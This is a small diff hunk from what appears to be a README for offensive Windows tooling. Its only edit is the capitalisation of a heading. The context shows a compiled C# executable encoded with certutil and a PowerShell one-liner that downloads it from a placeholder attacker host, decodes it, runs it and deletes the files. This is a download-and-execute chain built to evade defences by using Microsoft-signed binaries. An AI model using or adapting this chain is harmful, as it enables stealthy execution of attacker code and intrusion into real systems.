@@ -12,7 +12,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:test.exe .\am_s.cs
 ```powershell
 certutil -encode test.exe test.txt
 ```
-## Execute the binary using Microsoft Signed binaries
+## Execute the binary using Microsoft signed binaries
 ```powershell
 Start-Process -FilePath curl -ArgumentList "http://<IP>/test.txt -o $($pwd.Path)\test.txt" -Wait; certutil -decode "$($pwd.Path)\test.txt" "$($pwd.Path)\test.exe"; Start-Process -FilePath "$($pwd.Path)\test.exe" -Wait; Remove-Item -Path "$($pwd.Path)\test.exe"; Remove-Item -Path "$($pwd.Path)\test.txt"
 ```
